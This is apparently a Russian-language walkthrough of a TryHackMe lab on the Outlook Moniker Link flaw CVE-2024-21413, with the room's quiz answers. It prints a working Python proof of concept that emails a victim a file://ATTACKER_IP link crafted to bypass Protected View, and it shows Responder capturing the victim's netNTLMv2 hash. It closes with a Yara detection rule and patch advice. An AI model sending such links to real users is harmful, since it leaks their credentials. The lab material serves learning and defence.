[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Moniker Link (CVE-2024-21413)](https://tryhackme.com/r/room/monikerlink) 

Всего 6 заданий:
## Задание 1
13 февраля 2024 года компания Microsoft объявила об уязвимости Microsoft Outlook RCE и утечке учетных данных с 
присвоенным CVE - 2024-21413 (Moniker Link). Обнаружение уязвимости приписывают Хайфею Ли из Check Point Research . 

Уязвимость обходит механизмы безопасности Outlook при обработке определенного типа гиперссылки, известной как 
Moniker Link. Злоумышленник может злоупотребить этим, отправив жертве электронное письмо, содержащее вредоносную 
Moniker Link, в результате чего Outlook отправит злоумышленнику учетные данные NTLM пользователя после нажатия на 
гиперссылку.   

Подробная информация об оценке уязвимости представлена в таблице ниже:

- CVSS	Описание
- Дата публикации	13 февраля 2024 г.
- Статья МС	https://msrc.microsoft.com/update-guide/en-US/vulnerability/ CVE -2024-21413
- Влияние	Удаленное выполнение кода и утечка учетных данных
- Строгость	Критический
- Сложность атаки	Низкий
- Подсчет очков	9.8


Известно, что уязвимость затрагивает следующие выпуски Office:
- Выпускать	Версия
- Microsoft Office LTSC 2021	затронуто с 19.0.0
- Приложения Microsoft 365 для предприятий
- затронуто с 16.0.1
- Майкрософт Офис 2019
- затронуто с 16.0.1
- Майкрософт Офис 2016
затронуто с 16.0.0 до 16.0.5435.1001

### Цели обучения

- Как работает уязвимость
- Понимание «защищенного представления» Outlook
- Использование уязвимости для утечки учетных данных из клиента Outlook
- Меры обнаружения и смягчения последствий

### Запуск виртуальной машины
Обратите внимание, что вам понадобятся как AttackBox, так и уязвимая машина, подключенные к этой задаче. Чтобы 
развернуть подключенную виртуальную машину, нажмите зеленую Start Machine кнопку в верхней части задачи. Машина 
должна запуститься в режиме разделенного экрана. Если этого не произошло, вы можете нажать синюю Show Split 
View кнопку в правом верхнем углу этой страницы. Все комнаты можно просмотреть в режиме разделенного экрана, но если 
вы предпочитаете подключаться к машине через RDP, вы можете использовать следующие учетные данные:

ТМ-ключ
- Имя пользователя	tryhackme
- Пароль	Кх3гв439днк!

Разверните AttackBox и уязвимую машину в этой задаче. Машине потребуется около 5 минут для запуска, поэтому пока 
завершите эту задачу и перейдите в остальную часть комнаты; мы перейдем к машине позже. 

### Ответить на вопросы ниже
Какой уровень «серьезности» присвоен CVE?

```commandline
Critical
```

## Задание 2
Outlook может отображать электронные письма в формате HTML. Вы могли заметить, что это используется в ваших любимых 
информационных бюллетенях. Кроме того, Outlook может анализировать гиперссылки, такие как HTTP и HTTPS. Однако он 
также может открывать URL-адреса, указывающие приложения, известные как Moniker Links .  Обычно Outlook выводит 
предупреждение безопасности при запуске внешних приложений.

### Защищенный просмотр Outlook срабатывает при запуске внешнего приложения

Это всплывающее окно является результатом работы функции «Защищенный просмотр» в Outlook. Защищенный просмотр 
открывает электронные письма, содержащие вложения, гиперссылки и подобный контент, в режиме «только для чтения», 
блокируя такие вещи, как макросы (особенно из-за пределов организации).

Используя file://ссылку Moniker в нашей гиперссылке, мы можем указать Outlook попытаться получить доступ к файлу, 
например, к файлу на сетевом ресурсе ( <a href="file://ATTACKER_IP/test>Click me</a>). Используется протокол SMB, 
который подразумевает использование локальных учетных данных для аутентификации.  Однако «защищенный просмотр» 
Outlook перехватывает и блокирует эту попытку.
```commandline
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
```

Уязвимость здесь существует из-за изменения нашей гиперссылки для включения !специального символа и некоторого 
текста в нашу ссылку Moniker, что приводит к обходу защищенного просмотра Outlook. Например: 
```commandline
<a href="file://ATTACKER_IP/test!exploit>Click me</a>.  

<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

Мы, как злоумышленники, можем предоставить Moniker Link такого рода для атаки. Обратите внимание, что общий ресурс 
не обязательно должен существовать на удаленном устройстве, так как попытка аутентификации будет предпринята в любом 
случае, что приведет к отправке хэша Windows netNTLMv2 жертвы злоумышленнику.

Удаленное выполнение кода (RCE) возможно, поскольку Moniker Links использует Component Object Model (COM) в Windows. 
Однако объяснение этого в настоящее время выходит за рамки этой комнаты, поскольку нет публично опубликованного 
доказательства концепции для достижения RCE через этот конкретный CVE.

### Ответить на вопросы ниже
Какой тип ссылки Moniker мы используем в гиперссылке?
```commandline
file://
```
Какой специальный символ используется для обхода «защищенного просмотра» в Outlook?

```commandline
!
```

## Задание 3
Для этой атаки мы отправим нашей жертве по электронной почте ссылку Moniker, похожую на ту, что была предоставлена 
в предыдущей задаче. Цель, как атакующего, состоит в том, чтобы создать электронное письмо жертве с ссылкой 
Moniker, которая обходит "защищенный просмотр" Outlook, где клиент жертвы попытается загрузить файл с нашей 
атакующей машины, в результате чего будет захвачен хэш netNTLMv2 жертвы.   

Но сначала давайте рассмотрим PoC, который я создал (он также доступен на GitHub).
```commandline
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
PoC :
```


Берет адрес электронной почты злоумышленника и жертвы. Обычно вам нужно использовать свой собственный SMTP -сервер 
(он уже был предоставлен вам в этой комнате) 
Требуется пароль для аутентификации. Для этой комнаты пароль для attacker@monikerlink.thm — attacker
Содержит содержимое электронной почты (html_content), которое содержит нашу ссылку Moniker в виде гиперссылки HTML.
Затем заполните поля «тема», «от» и «кому» в письме.
Наконец, он отправляет электронное письмо на почтовый сервер.
Давайте используем Responder для создания SMB- прослушивателя на нашей атакующей машине. Для THM AttackBox интерфейс 
будет -I ens5. Имя интерфейса будет отличаться, если вы используете собственное устройство (например, Kali). Если вы 
хотите получить домашнее задание, можно также использовать сервер Impacket.

Запуск Responder на нашем AttackBox
```commandline
root@attackbox:# responder -I ens5
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

-- cut for brevity --

[+] Listening for events...
```

Давайте откроем уязвимую машину, нажав на панель «CVE-2024-21413» в режиме разделенного экрана.  

Открытие представления уязвимой машины на разделенной панели экрана

Откройте Outlook, нажав на ярлык «Outlook» на рабочем столе. Когда Outlook откроется, нажмите «Я не хочу входить в 
систему или создавать учетную запись» во всплывающем окне. 

Закрытие панели «Войти для настройки Office» в Outlook

Закройте второе всплывающее окно, нажав на «X» в правом верхнем углу всплывающего окна (возможно, вам придется 
немного перетащить окно влево, в зависимости от разрешения экрана). 

Закрытие панели «Введите ключ продукта» в Outlook

После завершения вы увидите интерфейс Outlook. Для этой комнаты почтовый ящик жертвы уже настроен в Outlook для вас.

Просмотр почтового ящика жертв

Вернитесь в AttackBox. Мы скопируем и вставим PoC выше в AttackBox.

Переключение на вид THM AttackBox на панели разделенного экрана

Для этого мы создадим новый файл на AttackBox. nano exploit.py и используем выдвижной лоток в режиме разделенного 
экрана. Посмотрите на GIF ниже, чтобы увидеть это в действии. 


Перед запуском скрипта Python нам необходимо выполнить некоторые начальные настройки AttackBox:

Измените ссылку на Moniker (строка № 12) в нашем PoC, чтобы она отражала IP-адрес нашего AttackBox.
Замените заполнитель MAILSERVER в строке №31 на MACHINE_IP
Когда все будет готово, мы можем запустить эксплойт. Когда будет предложено ввести пароль электронной почты 
злоумышленника, введите «атакующий». 

Запуск explore.py
```commandline
root@attackbox:# python3 exploit.py
Enter your attacker email password: attacker
```

Скрипт Python выведет "Email done" после отправки письма. Если скрипт жалуется на ошибку аутентификации, убедитесь, 
что вы правильно заменили значения в Exploit.py. Теперь вернемся к уязвимой машине и проверим наличие нового письма: 

Открытие письма, содержащего ссылку Moniker, после успешного запуска нашего скрипта эксплойта

Нажмите на гиперссылку «Нажмите меня» и вернитесь в нашу терминальную сессию «Responder» на AttackBox:

Вернувшись в AttackBox, мы видим, что хэш netNTLMv2 пользователя был захвачен ответчиком.

Успех! Хэш netNTLMv2 жертвы был захвачен на нашем AttackBox.

### Ответить на вопросы ниже
Как называется приложение, которое мы используем на AttackBox для захвата хэша пользователя?

```commandline
responder
```
Какой тип хэша сохраняется при нажатии на гиперссылку в письме?

```commandline
netNTLMv2
```

## Задание 4
ЯРА

Флориан Рот создал правило Yara для обнаружения писем, содержащих элемент в ссылке Moniker.file:\\
```commandline
CVE
-2024-21413 Правило Яры создано Флорианом Ротом
user@yourmachine:# cat cve-2024-21413.yar 


rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {

   meta:

      description = "Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook"

      author = "X__Junior, Florian Roth"

      reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"

      date = "2024-02-17"

      modified = "2024-02-19"

      score = 75

   strings:

      $a1 = "Subject: "

      $a2 = "Received: "



      $xr1 = /file:\/\/\/\\\\[^"']{6,600}\.(docx|txt|pdf|xlsx|pptx|odt|etc|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/

   condition:

      filesize < 1000KB

      and all of ($a*)

      and 1 of ($xr*)

}
```


### Wireshark

Кроме того, запрос SMB от жертвы к клиенту можно увидеть в перехвате пакета с усеченным хешем netNTLMv2.

Захват пакета Wireshark, показывающий аутентификацию SMBB.
### Ответить на вопросы ниже
Нажмите на меня, чтобы перейти к следующему заданию!

```commandline
Ответ не нужен
```

## Задание 5
Microsoft включила исправления для устранения этой уязвимости в февральский выпуск «вторника исправлений». Вы можете 
увидеть список статей базы знаний по сборкам Office здесь. Настоятельно рекомендуется обновить Office через Центр 
обновления Windows или каталог Центра обновления Microsoft.  

Кроме того, в то же время, это своевременное напоминание о необходимости практиковать общие - безопасные - методы 
кибербезопасности. Например, напоминать пользователям: 

Не нажимайте на случайные ссылки (особенно из нежелательных писем)
Просматривайте ссылки перед тем, как нажимать на них
Пересылайте подозрительные электронные письма в соответствующий отдел, отвечающий за кибербезопасность.
Поскольку эта уязвимость обходит защищенный просмотр Outlook, нет способа перенастроить Outlook для предотвращения 
этой атаки. Кроме того, полное блокирование протокола SMB может принести больше вреда, чем пользы, особенно потому, 
что он необходим для доступа к сетевым ресурсам. Однако вы можете заблокировать это на уровне брандмауэра, в 
зависимости от организации.

### Ответить на вопросы ниже
Нажмите на меня, чтобы перейти к следующему заданию.

```commandline
Ответ не нужен
```

## Задание 6
Поздравляю! Это было весело. Как мы знаем, Outlook — чрезвычайно популярный почтовый клиент. Известно, что CVE 
затрагивает большую часть пакета Office, и, учитывая его крайне низкую сложность атаки, это довольно пикантно. 

Помните, что крайне важно как можно скорее обновить Outlook через Центр обновления Windows или Каталог обновлений 
Microsoft, поскольку не существует способа предотвратить обход «защищенного просмотра» Outlook. 

Надеюсь, вам понравилась комната!

### Ответить на вопросы ниже
Шалость удалась.
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)